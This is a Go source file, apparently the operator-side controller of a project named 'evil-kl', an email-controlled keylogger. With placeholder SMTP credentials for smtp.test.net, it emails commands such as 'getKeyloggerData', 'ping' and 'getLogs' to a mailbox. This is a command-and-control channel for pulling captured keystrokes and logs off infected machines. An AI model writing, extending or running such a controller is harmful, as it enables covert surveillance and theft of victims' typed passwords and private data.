package main

import (
	"fmt"
	"time"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/app/mail"
)

// LC - logging's category
const LC = "MAIN"

func sender() {

}

func main() {
	configInst := new(config.Config).Create()
	cfg := configInst.GetConfig()

	logCfg := logger.Cfg{
		AppName: "TEST",
		LogPath: "",
		Level:   0,
	}

	logger.SetConfig(logCfg)

	logger.InfoJ(LC, "STARTING")

	mailInst := new(mail.Mail).Create()

	cfg.Mail.SMTP.Username = "smthuser@test.net"
	cfg.Mail.SMTP.Password = "password"
	cfg.Mail.SMTP.From = "smthuser@test.net"
	cfg.Mail.SMTP.Host = "smtp.test.net"
	cfg.Mail.SMTP.Port = 25

	mailInst.SetIMAPSetting(cfg.Mail.IMAP)
	mailInst.SetSMTPSetting(cfg.Mail.SMTP)
	mailInst.SetServiceMask(cfg.Service.Name)
	mailInst.SetServiceID(cfg.Service.ID)

	bodies := []string{
		"{\"method\":\"getKeyloggerData\"}",
		"{\"method\":\"ping\"}",
		"{\"method\":\"getLogs\"}",
	}

	for _, body := range bodies {
		if err := mailInst.Send(cfg.Mail.IMAP.Username,
			fmt.Sprint("{\"uuid\":\"", cfg.Service.ID, "\",\"description\":\"", cfg.Service.Name, "\"}"),
			body,
			"",
		); err != nil {
			continue
		}

		time.Sleep(2 * time.Second)
	}

	logger.InfoJ(LC, "STOPING")
}
